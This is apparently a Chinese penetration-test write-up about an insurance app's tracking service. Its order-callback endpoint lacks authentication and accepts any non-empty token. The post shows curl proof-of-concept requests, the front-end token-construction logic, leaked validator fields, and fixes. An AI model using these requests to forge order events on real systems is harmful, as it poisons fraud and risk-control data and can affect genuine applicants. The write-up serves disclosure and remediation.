---
title: "保险 H5 埋点服务：订单回调接口无鉴权，token 可伪造"
date: 2026-08-05 00:00:00
categories:
  - 渗透
tags:
  - 未授权访问
  - 业务逻辑
  - Token
description: "从保险 H5 的埋点接口发现鉴权缺失，通过随机 token、虚假订单和空值对照分析订单回调伪造问题。"
cover: /images/pentest/insurance-order-callback-auth-bypass.jpg
---

> 域名等资产信息已隐去，统一写作 `<目标域名>`；响应内容有裁剪。

## 背景

测试对象是一个保险类 H5。主站防护比较全，翻了半天没找到入口。

埋点流量比较特殊：H5 里接了埋点 SDK，用户操作会往一个独立域名上报，投保、续保、订单提交都在里面。这个域名和主站不是同一套，解析到的 IP 也不在一个段，应该是单独部署的服务。

## 接口清单

根路径是 404，没有页面也没有文档。从 H5 的 JS bundle 里搜路由，找到这些：

```text
/backtrack/need_review
/backtrack/order_callback
/backtrack/savefile
/backtrack/token_css/save
```

## 不带凭证请求

```bash
TARGET="https://<目标域名>"

curl -sk "$TARGET/backtrack/need_review?sku_name=test"
```

回显：

```json
{"code":0,"msg":"success","data":{"need_review":false}}
```

请求没有 Cookie、Token、Authorization 头。`need_review=false` 表示该产品不需要核保审核，返回的是业务数据。

换成前端商品配置里真实在售的 sku 再请求，结果相同。

## order_callback

这个接口用来上报"订单已提交"，参数只有 `token` 和 `order_id`：

```bash
curl -sk -X POST "$TARGET/backtrack/order_callback" \
  -H "Content-Type: application/json" \
  -d '{"token":"abcdef1234567890ab","order_id":"999999999"}'
```

回显：

```json
{"code":0,"msg":"success"}
```

token 是随手敲的字符串，order_id 用的 999999999，一个不存在的单号。两个参数都通过校验，回调被当成正常请求处理。

## 空 token 对照

单独看上面那条，也可能只是 token 校验比较宽松。把 token 置空再发一次：

```bash
curl -sk -X POST "$TARGET/backtrack/order_callback" \
  -H "Content-Type: application/json" \
  -d '{"token":"","order_id":"1"}'
```

回显：

```json
{"code":1001,"msg":"参数缺失"}
```

空字符串被拒，随机字符串通过。服务端只判断了 token 非空，没有校验内容，也没有和会话绑定。

## token 生成逻辑

服务端不校验 token，说明它大概率是前端生成的。在 bundle 里搜到这段（前缀和盐值已隐去）：

```js
var a = "" + PREFIX + Date.now() + rand.join("");   // 前缀 + 时间戳 + 18 位随机 hex
var token = a + sha1(a + SALT).substring(0, 2);     // 末尾补 sha1 前 2 位
```

结构是固定前缀 + 毫秒时间戳 + 18 位随机 hex，最后补两位 sha1 当校验位。算法完全在前端，没有服务端签发，所以随便拼一个非空串也能过。

## 同服务其他接口

```bash
curl -sk -X POST "$TARGET/backtrack/savefile" \
  -H "Content-Type: application/json" -d '{}'
```

回显是 `product_code` 校验失败。是参数校验失败，不是鉴权失败，说明请求已经进到业务逻辑里。

```bash
curl -sk -X POST "$TARGET/backtrack/token_css/save" \
  -H "Content-Type: application/json" -d '{}'
```

回显里直接列出了结构体字段和必填要求：

```text
TokenStyleReq.Token        必填
TokenStyleReq.ProductCode  必填
TokenStyleReq.Version      必填
```

validator 的报错没有统一处理，原样返回给了客户端。

## 影响

`order_callback` 的数据进入风控和反欺诈，对应"用户已提交订单"这个概念。三个条件叠加：order_id 是整数可遍历、token 可以随便构造、接口没有频率限制。

可以批量伪造订单提交行为。伪造的正常行为会稀释风险特征，真实的高风险用户可能因此被判为正常；大量异常数据也可能触发错误的风控规则，影响正常用户投保。

这类数据污染事后不好处理，从记录上分不出哪些是真实用户产生的。

## 修复

1. `/backtrack/*` 统一加鉴权，不只修 `order_callback`；
2. token 改为服务端签发，HMAC + 时间戳 + nonce，校验签名和有效期；
3. `order_id` 校验是否存在、是否属于当前用户，回调接口加签名和幂等；
4. 加限流；
5. 统一异常处理，不要返回结构体校验细节。

---

## 验证截图

![订单回调接口的对照测试与终端回显](/images/pentest/order-callback-proof.png)
